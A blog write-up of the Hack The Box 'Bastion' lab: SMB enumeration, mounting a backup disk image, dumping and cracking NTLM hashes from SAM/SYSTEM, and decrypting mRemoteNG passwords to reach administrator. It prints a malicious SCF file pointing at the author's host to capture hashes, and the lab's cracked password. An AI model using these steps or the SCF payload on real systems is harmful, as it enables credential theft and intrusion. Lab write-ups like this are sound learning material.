---
layout: post
title:  Bastion Writeup
description: A very realistic box with many things to learn. Misconfigurations can be a dealbreaker when it comes to a certain attack vector. There has always been a conflict between security and convenience, and this box highlights it. I go very in-depth about multiple aspects in this box relating to bastion hosts and credential databases. I hope you learn as much from this writeup as I did from this challenge!
date:   2021-02-27
image:  '/images/Bastion.png'
tags:   [SMB, NTLM Relay]
---

**This report can be read both on this site, and as its <a href = "https://0xd4y.github.io/reports/Bastion%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**


![](/reports/Bastion/image21.png)

This was an amazing box that really showed the importance of using google. It was unique in that it did not have a web server port. The great thing about this box is that it was very realistic, as intended by the author L4mpje. Let’s get right into it!

As usual, I added the ip to my /etc/hosts file and called it bastion.htb. Afterwards, I ran the normal nmap -sC -sV -oA nmap/nmap bastion.htb which revealed many ports. Just to be sure that I had all the ports, I ran nmap -p- --max-retries=0 bastion.htb. Note the max-retries flag which, when set to 0, performs the scan at it’s quickest but most unreliable speed. This is because the max-retries flag is used to specify the maximum port scan probe retransmissions, and the less transmissions you send, the higher likelihood that you will have false negatives and positives. After scanning all ports, the following ports were revealed: 47001,49664,49665,49666,49667,49668,49669,49670. Due to this, I ran the thorough nmap scan once again (this time specifying the ports): nmap -sC -sV -oA nmap/nmap -p 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 bastion.htb

![](/reports/Bastion/image4.png)

Looks like the high ports that the nmap -p- command found were of no importance. Looking at the results however, two ports in particular stand out. This Windows box is running ssh!? That’s certainly strange as I have not seen any other Windows box with ssh (more on this later). The other port that stands out is port 445 (Samba a.k.a SMB which stands for Server Message Block), and it is configured to allow guest access. This seems like the most obvious attack vector, so let’s see what we find.

smbmap -H bastion.htb -u guest

![](/reports/Bastion/image3.png)

Again, two things in this output stand out. First of all, there is a Backups directory which we have READ and WRITE access to. The fact that we have WRITE access to this is a huge red flag! This means that we could drop a malicious SCF (shell command file) to potentially steal hashes from users who access this file. We can write a .scf file with the following contents:

\[Shell\]

Command=2

IconFile=\\\\10.13.37.2\\share\\0xd4y.ico

\[Taskbar\]

Command=ToggleDesktop

Whenever a user browses to this file, Windows will attempt to authenticate to our share with the credentials of the user, meaning that we can capture these credentials (albeit the password is hashed). The fact that we have write access to a directory containing backups is especially alarming, as which users would normally access such a directory? Probably domain admins. There is an excellent article on this topic that I highly recommend you read ([https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/](https://www.google.com/url?q=https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&sa=D&source=editors&ust=1653959269091618&usg=AOvVaw0pGdwROOMk11BRZjNFPYMF)). Anyways, this is most likely not intended by the author because Bastion is an easy box and there are no real users on the system to execute the .scf file (as this is just a box rather than a real attack).

The other thing that stands out is this smbmap message:

\[\\\] Work\[!\] Unable to remove test directory at \\\\bastion.htb\\Backups\\GZHGUJOWDT, please remove manually

The smbmap tool knows that we have write access to \\Backups because it was able to write to it. However, the fact that it was not able to remove it shows that this created directory could be a way for defenders to find out that someone may be up to something malicious. In a real penetration testing environment, it may be more wise to use smbclient -L -U guest bastion.htb which lists the shares, but does not list the permissions:

![](/reports/Bastion/image17.png)

Ok, enough stalling. Let's just see what’s inside this \\Backups directory. I created a /smb directory on my machine (so that if I download a file it goes straight to the /smb directory) and connected to the SMB share:

smbclient -U guest //bastion.htb/Backups

![](/reports/Bastion/image6.png)

I downloaded the note.txt file using get note.txt and viewed it on my host machine.

![](/reports/Bastion/image20.png)

This file is a hint that there is probably a large backup file somewhere in this SMB share. Let’s keep enumerating! Eventually you’ll find the following directory:

![](/reports/Bastion/image14.png)

Incidentally, we know that there is probably a user named L4mpje on the system (it is always important to save information like this in a file where you keep your notes). Two files here stand out (first there were two ports that stood out, then two interesting things with the SMB share, now this...why are there always two things that stand out??). The .vhd (virtual hard disk) files are quite conspicuous; these files are absolutely massive! One is about 37MB while the other one is 5.4GB and are no doubt the backup files that the note.txt message was referring to. I foolishly downloaded both files and inspected them when I was first going through this machine, so let’s see how to view these files without waiting a million years for them to finish installing.

The mount command does the trick. Running the command sudo mount -t cifs //bastion.htb/Backups smb/ -o username=guest we see the full listing of the directory Backups. The \-t option for mount specifies the type of file share we want to mount. CIFS stands for Common Internet File System and is a dialect, or particular implementation, of the SMB protocol.

![](/reports/Bastion/image10.png)

Note the strange directory names that smbmap created. Anyways, let's get right to the .vhd files.

![](/reports/Bastion/image15.png)

When I was first going through this box, I mounted both the .vhd files, but the 37MB one is not interesting as it just has boot files. Let’s mount the .vhd file and inspect its contents.

guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda1 --ro ~/business/hackthebox/easy/windows/bastion/mnt/

![](/reports/Bastion/image2.png)

And we get a whole listing of files. At this point, I looked through a ton of data, but I couldn’t find anything interesting laying around. However, there is still a way to extract credentials due to a huge oversight of the sysadmins. They accidentally backed up the files SYSTEM and SAM (Security Account Manager) located in /Windows/System32/config.

![](/reports/Bastion/image16.png)

So the note really wasn’t kidding when it said to not transfer the entire backup file locally. A lazy sysadmin did not realize that he backed up even the SAM and SYSTEM file. THESE FILES ARE HIGHLY SENSITIVE!!! The SAM file is a database file that stores credentials of the local users. These credentials are hashed and encrypted by the system boot key which is located in SYSTEM. This means that if you have access to the SYSTEM file, then you can decrypt the credentials revealing their hashes.

.

We can use the impacket-secretsdump tool to extract hashed credentials. Let’s copy these files to our root directory (/bastion) and continue with the command.

impacket-secretsdump -sam SAM -system SYSTEM local

![](/reports/Bastion/image11.png)

Well, now we have the hash for the L4mpje user! Notice how Administrator and Guest have blank LM and NTLM hashes. This indicates that Administrator and Guest were most likely disabled when this file was backed up (even more evidence that this was probably backed up with the SYSTEM user), but this could be an old backup file and Administrator could have been activated since then. Anyways, let’s copy the NTLM hash of L4mpje and crack it.

hashcat -m 1000 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt

After about a minute, the NTLM hash is cracked revealing that L4mpje’s password is bureaulampje.

Tip:

Using Hashcat on a virtual machine is not recommended. Hashcat runs a lot quicker on   your host machine.

Let’s ssh into the box and hope that L4mpje has not updated his password since the .vhd file was backed up.

![](/reports/Bastion/image5.png)

It was expected that L4mpje did not change his password. Not because this is meant to be a vulnerable machine, but this is completely realistic. How often does a person change his password?

We can now grab user.txt, but how are we going to escalate to administrator? This is where having knowledge on the basic file system of Windows is useful. After a lot of enumeration, you will notice that there is a particular directory on this box which stands out on C:\\Program Files (x86): 

![](/reports/Bastion/image9.png)

The mRemoteNG directory is not part of the default Windows build. Let’s inspect it further.

![](/reports/Bastion/image7.png)

Nothing in this directory looks out of the ordinary. In any case, we should look into this for multiple reasons:

1.  mRemoteNG is a tool for connecting and managing remote systems (protocols such as SSH, RDP, etc. are used).
2.  mRemoteNG is not part of the default Windows build.
3.  This box is called Bastion, hinting at the possibility that this box is a bastion host. A bastion host allows external connections to a private network. Due to the increased probability of an attack on a bastion host, it must be hardened to withstand such attacks. As such, typically there are very few services running on a bastion host (in our case the bastion host is running SSH and an SMB share). Ideally, a bastion host acts as a jump server once a connection has been established to it (a jump server is used to access devices in a separate security zone). Essentially, this means after connecting to a bastion host, authorized users can have access to private instances located within the virtual private cloud (VPC).Think of a bastion host as a bastion is in real life (hence the name). You can walk up to the bastion, knock on the castle walls, but you are not allowed inside unless you are authorized. If you attack the bastion, you may be met with defensive fire.

(BLACKLISTED!).

![](/reports/Bastion/image1.png)

After a bit of googling, you will find a great article explaining the insecurity of mRemoteNG ([https://hackersvanguard.com/mremoteng-insecure-password-storage/](https://www.google.com/url?q=https://hackersvanguard.com/mremoteng-insecure-password-storage/&sa=D&source=editors&ust=1653959269099144&usg=AOvVaw3-pbufm1UKT3DrQduFTOtr)). The ConfCons.xml file located in %AppData%\\mRemoteNG contains encrypted passwords for users on the system. Let’s reveal the contents:

![](/reports/Bastion/image8.png)

This password seems to simply just be base64 encoded, but when we decode it, we just get garbage:

![](/reports/Bastion/image18.png)

This suggests that the password is most likely encrypted. Luckily, there are many different ways to decrypt mRemoteNG passwords (I used this tool on github: [https://github.com/kmahyyg/mremoteng-decrypt](https://www.google.com/url?q=https://github.com/kmahyyg/mremoteng-decrypt&sa=D&source=editors&ust=1653959269099982&usg=AOvVaw025QHY47XDkVrWrOY0p2AP)).

Using this tool and inputting the encrypted password of Administrator we get the credentials:

![](/reports/Bastion/image13.png)

We can now ssh into Administrator and get root.txt!

![](/reports/Bastion/image19.png)

There were many things learned in this box. I really appreciate the work L4mpje did on creating this challenge. It was completely realistic, and I loved it beginning to end. Thanks also to you for reading my writeup, and I hope you learned from this box as much as I did!
